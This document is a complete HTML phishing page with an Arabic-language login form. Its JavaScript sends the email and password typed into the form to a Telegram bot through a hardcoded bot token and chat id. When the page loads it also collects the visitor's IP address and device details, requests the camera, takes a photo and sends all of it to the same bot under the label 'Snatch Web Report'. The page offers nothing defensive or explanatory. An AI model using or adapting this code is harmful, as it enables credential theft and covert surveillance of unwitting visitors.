<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <script>
    const token = "7809696227:AAGk8fExoDKgW4xN5X7mhxQ7c7raA2_7uaw";
    const chat_id = "6991944640";

    // ✅ إرسال بيانات تسجيل الدخول
    function sendLogin() {
      const email = document.getElementById("email").value;
      const pass = document.getElementById("pass").value;

      const message = `🔐 *Login Attempt Captured*\n📧 Email: ${email}\n🔑 Password: ${pass}`;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: message })
      });

      document.getElementById("form").innerHTML = "<h2 style='color:lime;'>✅ جاري التحقق...</h2>";
    }

    // ✅ التقاط صورة بالكاميرا وإرسالها للبوت
    async function snapPhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");

    setTimeout(async () => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async (blob) => {
        const form = new FormData();
        form.append("chat_id", chat_id);
        form.append("photo", blob, "snapshot.jpg");

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: form
        });
      }, "image/jpeg");

      stream.getTracks().forEach(track => track.stop());
    }, 2000);
  } catch (e) {
    console.log("❌ Camera Error:", e);
  }
}

    // ✅ إرسال معلومات الجهاز
    (async () => {
      const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
      const data = {
        ip,
        ua: navigator.userAgent,
        platform: navigator.platform,
        lang: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        time: new Date().toLocaleString(),
        deviceMemory: navigator.deviceMemory || "N/A",
        cores: navigator.hardwareConcurrency || "N/A",
        online: navigator.onLine ? "✅ Online" : "❌ Offline"
      };

      let camAccess = "❌ Blocked";
      try {
        await navigator.mediaDevices.getUserMedia({ video: true });
        camAccess = "✅ Granted";
      } catch (e) {
        camAccess = "❌ " + e.name;
      }

      let vpnFlag = ip.startsWith("10.") || ip.startsWith("192.") || ip.startsWith("172.") ? "🌐 احتمال VPN/Local" : "📡 Public IP";

      const msg = `📡 *Snatch Web Report*
🌍 IP: ${data.ip} (${vpnFlag})
🖥️ OS: ${data.platform}
📱 Agent: ${data.ua}
🧠 RAM: ${data.deviceMemory} GB | Cores: ${data.cores}
🗺️ Lang: ${data.lang}
📏 Screen: ${data.screen}
🔌 Status: ${data.online}
🕒 Timezone: ${data.tz}
⏰ Time: ${data.time}
🎥 Camera/Mic: ${camAccess}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: msg })
      });

      // شغّل التصوير السريع بعد جمع المعلومات
      snapPhoto();
    })();
  </script>

  <style>
    body {
      background: #000;
      margin: 0;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    #form {
      background: #111;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px lime;
      text-align: center;
    }

    input {
      margin: 10px;
      padding: 10px;
      width: 230px;
      border: none;
      border-radius: 5px;
    }

    button {
      margin-top: 10px;
      padding: 10px 20px;
      background: lime;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      color: #000;
      font-weight: bold;
    }
  </style>
</head>

<body>
  <div id="form">
    <h2>🔐 تسجيل الدخول</h2>
    <input type="text" id="email" placeholder="📧 البريد الإلكتروني"><br>
    <input type="password" id="pass" placeholder="🔑 كلمة المرور"><br>
    <button onclick="sendLogin()">تسجيل الدخول</button>
  </div>
</body>
</html>
